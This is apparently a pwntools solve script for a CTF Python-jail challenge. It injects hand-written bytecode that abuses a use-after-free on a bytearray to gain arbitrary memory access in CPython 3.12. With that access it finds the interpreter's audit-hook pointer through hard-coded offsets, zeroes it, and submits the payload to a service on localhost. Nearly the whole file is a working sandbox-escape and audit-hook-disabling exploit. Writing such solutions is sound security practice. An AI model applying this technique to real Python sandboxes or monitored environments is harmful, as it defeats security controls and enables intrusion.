#!python3.12
from pwn import *

# def get_codes():
#     class T:
#         def __index__(self):
#             global memory
#             uaf.clear()
#             memory = bytearray()
#             uaf.extend([0] * 56)
#             return 1
#     uaf = bytearray()
#     print(T.__index__.__code__.co_code.hex(),
#           T.__index__.__code__.co_names, 
#           T.__index__.__code__.co_consts,
#           T.__index__.__code__.co_nlocals,
#           T.__index__.__code__.co_varnames,
#           T.__index__.__code__.co_freevars,
#           T.__index__.__code__.co_cellvars,
#           T.__index__.__code__.co_varnames,
#           T.__index__.__code__.co_stacksize,
#           T.__index__.__code__.co_cellvars)
#     getptr = lambda func: int(str(func).split("0x")[-1].split(f"{62:c}")[0], 16)
#     print(getptr.__code__.co_code.hex(),
#           getptr.__code__.co_names, 
#           getptr.__code__.co_consts,
#           getptr.__code__.co_nlocals,
#           getptr.__code__.co_varnames,
#           getptr.__code__.co_freevars,
#           getptr.__code__.co_cellvars,
#           getptr.__code__.co_varnames,
#           getptr.__code__.co_stacksize,
#           getptr.__code__.co_cellvars)

# # uncommented for getting const bytecodes
# get_codes()
# print("---")

# # uncommented for type hint
# def auditHookHandler(e):
#     def handler(x, _):
#         if not (x == "object.__getattr__" or x == "object.__setattr__" or x == "code.__new__"):
#             e(1)
#     return handler

def test():
    B = auditHookHandler(0)
    B.__code__ = B.__code__.replace(co_code=bytes.fromhex("970074010000000000000000740300000000000000007c00ab010000000000006a050000000000000000000000000000000000006401ab010000000000006402190000006a05000000000000000000000000000000000000640364049b04ab010000000000006405190000006406ab020000000000005300"),
                                    co_names=('int', 'str', 'split'),
                                    co_consts=(None, '0x', -1, 62, 'c', 0, 16),
                                    co_nlocals=1,
                                    co_varnames=('func',),
                                    co_argcount=1,
                                    co_stacksize=6,
                                    co_freevars=("",))
    A = type("A", (object,), {"__index__": auditHookHandler(0)})
    i = A.__index__
    i.__code__ = i.__code__.replace(co_code=bytes.fromhex("9501970089016a01000000000000000000000000000000000000ab00000000000000010074030000000000000000ab00000000000000610289016a070000000000000000000000000000000000006401670164027a050000ab0100000000000001007903"), 
                                                        co_names=('clear', 'bytearray', 'memory', 'extend'),
                                                        co_consts=(None, 0, 56, 1),
                                                        co_nlocals=1,
                                                        co_varnames=("self",),
                                                        co_argcount=1,
                                                        co_stacksize=4,
                                                        co_freevars=("",))
    # PTR_OFFSET = [24, 48, 0x46920, -0xc948] # for python3.12.4
    i.__closure__[0].cell_contents = bytearray(56)
    i.__closure__[0].cell_contents[23] = A()
    ptr = B(os.system.__init__) + 24
    ptr = int.from_bytes(memory[ptr:ptr + 8], 'little') + 48
    auditHookByPy = int.from_bytes(memory[ptr:ptr + 8], 'little') + 0x46920
    memory[auditHookByPy:auditHookByPy + 8] = [0] * 8

context.log_level = 'debug'

import json

test_code = {"co_code": test.__code__.co_code.hex(),
            "co_consts": test.__code__.co_consts,
            "co_names": test.__code__.co_names,
            "co_stacksize": test.__code__.co_stacksize,
            "co_nlocals": test.__code__.co_nlocals,
            "co_varnames": test.__code__.co_varnames}

# conn = process(["python3.12", "pyjail-xctf/auditedJail-task/env/docker/deploy/bin/src/jail.py"])
conn = remote("127.0.0.1", 80)
conn.sendlineafter(b"json: ", json.dumps({"co_code": test.__code__.co_code.hex(),
            "co_consts": test.__code__.co_consts,
            "co_names": test.__code__.co_names,
            "co_stacksize": test.__code__.co_stacksize,
            "co_nlocals": test.__code__.co_nlocals,
            "co_varnames": test.__code__.co_varnames}).encode())
print(conn.recvall().decode())
conn.close()